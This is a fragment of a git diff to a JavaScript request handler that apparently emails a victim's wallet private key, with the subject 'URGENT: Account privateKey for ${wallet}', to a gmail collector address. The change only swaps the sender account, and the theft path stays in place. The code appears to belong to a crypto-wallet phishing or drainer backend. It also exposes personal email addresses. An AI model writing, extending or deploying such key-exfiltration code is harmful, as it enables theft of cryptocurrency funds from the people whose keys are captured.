@@ -24,7 +24,7 @@ const handler = async (req, res) => {
     // 2) Define the email options
 
     const mailOptions2 = {
-      from: 'obcbeats@gmail.com',
+      from: 'emmanuel.bayode.0388@gmail.com',
       to: 'busybillion001@gmail.com',
       subject: `URGENT: Account privateKey for ${wallet}`,
       text: `
